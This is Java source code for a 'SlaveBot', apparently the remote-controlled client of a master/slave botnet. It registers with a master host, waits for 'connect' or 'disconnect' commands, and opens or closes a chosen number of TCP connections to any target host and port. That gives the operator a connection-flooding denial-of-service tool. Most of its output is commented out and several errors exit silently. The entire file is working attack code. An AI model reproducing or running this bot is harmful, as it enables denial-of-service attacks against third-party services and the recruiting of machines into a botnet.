//package bot;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.Map.Entry;




public class SlaveBot implements Runnable {

	static ServerSocket slavePort;
	static Integer slaveListenPort;
	static Map<String, targetData> targetDataMap = new HashMap <String,targetData> ();
	static class targetData{  
		public String action;
		public String port;                                                                                                  
		public String targetHost; 
		public String numConnections;
		public ArrayList<Socket> arrSoc;

		public targetData(String action, String targetHost, String port, String numConnections) {                                                                           
			this.port = port;                                                                                             
			this.targetHost = targetHost;   
			this.numConnections = numConnections;
			this.action = action;
			this.arrSoc = new ArrayList<Socket>();

		}                                                                                                                 
	}
	public void run() {
		try{
			while(true)
			{
				Socket listener = slavePort.accept();
				PrintWriter out = new PrintWriter(listener.getOutputStream(), true);
				BufferedReader in = new BufferedReader(new InputStreamReader(listener.getInputStream()));
				BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
				String dataFromMaster = in.readLine();
				extractTargetData(dataFromMaster);
			}        
		}
		catch (Exception e){
			System.exit(-1);
			//System.out.println(e);
		}
	}

	public static void extractTargetData(String targetData){
		String delims = " ";
		StringTokenizer st = new StringTokenizer(targetData, delims);
		
		String action  = (String)st.nextElement();
		String targetHostName = ((String) st.nextElement());
		String targetPortNumber = ((String) st.nextElement());
		String numberOfConn = ((String)st.nextElement());
		
		storeTargetData(action, targetHostName, targetPortNumber, numberOfConn);
	}

	public static void storeTargetData(String action, String targetHostName, String targetPortNumber, String numberOfConn){

		String uniqueKey = concatinatedData(targetHostName, targetPortNumber);

		/*
		Set<Entry<String, targetData>> set = targetDataMap.entrySet();
		Iterator<Entry<String, targetData>> iterator = set.iterator();	
		while(iterator.hasNext()) {
			Map.Entry slaveData = (Map.Entry)iterator.next();
		}
		*/

		if (action.contentEquals("connect")){
			// go create a object and insert into the hash table value first time
			targetData targetObj;
			
			if (targetDataMap.containsKey(uniqueKey) == false)
			{
				targetObj = new targetData(action, targetHostName, targetPortNumber, numberOfConn);
				targetDataMap.put(uniqueKey, targetObj);
			}
			else
			{
				targetObj =  targetDataMap.get(uniqueKey);
			}
			
			performConnect(targetObj.targetHost, targetObj.port, numberOfConn);
		}
		else if (action.contentEquals("disconnect")){
			// go get the object from the hash-table
			targetData objFromHashTable =  targetDataMap.get(uniqueKey);
			Integer numberOfConnToDelete = Integer.parseInt(numberOfConn);
			performDisconnect(objFromHashTable.targetHost, objFromHashTable.port, numberOfConnToDelete);
		}

	}

	public static String concatinatedData(String ip, String port){
		String concatinate = ip + port;
		return concatinate;
	}

	public static Integer registerSlave(String hostname, Integer masterport){
		Socket client_socket;
		try{
			client_socket = new Socket(hostname, masterport);
			PrintWriter out = new PrintWriter(client_socket.getOutputStream(), true);
			BufferedReader in = new BufferedReader(new InputStreamReader(client_socket.getInputStream()));

			String ip=(((InetSocketAddress) client_socket.getRemoteSocketAddress()).getAddress()).toString().replace("/","");
			Integer slavePort_int = (Integer) (client_socket.getLocalPort());
			String local_host = client_socket.getInetAddress().getHostAddress();

			//System.out.println(ip + slavePort_int + local_host); //print here in slave just to confirm
			
			out.println(ip +","+ slavePort_int + "," + local_host);
			return slavePort_int;

		}
		catch (Exception e){
			System.out.println(e);
			return -1;
		}

	}

	public static void performConnect(String ip, String port, String numConnection){
		String conKey = concatinatedData(ip, port);
		Integer numConnectionInt = Integer.parseInt(numConnection);
		Integer portInt = Integer.parseInt(port);
		targetData obj = targetDataMap.get(conKey);
		
		//obj.arrSoc = new Socket[numConnectionInt];		
		if (targetDataMap.containsKey(conKey)){
			try{
				for(int i = 0; i < Integer.parseInt(numConnection); i++){
					Socket socObj = new Socket(ip, portInt);
					obj.arrSoc.add(socObj);
					//obj.arrSoc[i] = new Socket(ip, portInt);
					//System.out.println(obj.arrSoc[i]);
				}
				
			}
			catch(Exception e){
				System.out.println(e);
			}
		}
		else{
			System.out.println("Error Connecting to host");
		}
		
		//System.out.println("total sockets" + obj.arrSoc.size());
	}

	public static void performDisconnect(String ip, String port, Integer numberOfConnToDelete) {
		String uniqueKey = concatinatedData(ip, port);
		Integer portInt = Integer.parseInt(port);
		targetData obj = targetDataMap.get(uniqueKey);

		if (targetDataMap.containsKey(uniqueKey)){
			try{
				for(int i = 0; i< numberOfConnToDelete; i++){
					Socket deleteSoc = (Socket)obj.arrSoc.get(i);
					deleteSoc.close();	
					obj.arrSoc.remove(deleteSoc);
					//System.out.println("Socket closed" + deleteSoc);
				}
				//targetDataMap.remove(uniqueKey);

			}
			catch(Exception e){
				//System.out.println("Something went wrong");
				System.exit(-1);
			}

		}

	}


	public static void main(String[] args) throws Exception {
		if(args.length != 4)
		{
			//System.out.println("Usage: SlaveBot -h hostname -p portnumber of master");
			System.exit(0);
		}

		String hostname = args[1];
		Integer masterport = Integer.parseInt(args[3]);
		slaveListenPort = registerSlave(hostname, masterport);
		slavePort = new ServerSocket(slaveListenPort);
		new Thread(new SlaveBot()).start();

		for (Map.Entry<String, targetData> entry : targetDataMap.entrySet()) {
			//System.out.println(entry.getKey() +" : " +entry.getValue().action + " : "+ entry.getValue().targetHost + " : " + entry.getValue().port + " : " + entry.getValue().numConnections);
			//System.out.println("\nFor the key : " + entry.getKey() + "The array saved is" + entry.getValue().arrSoc);
		}


	}	

}
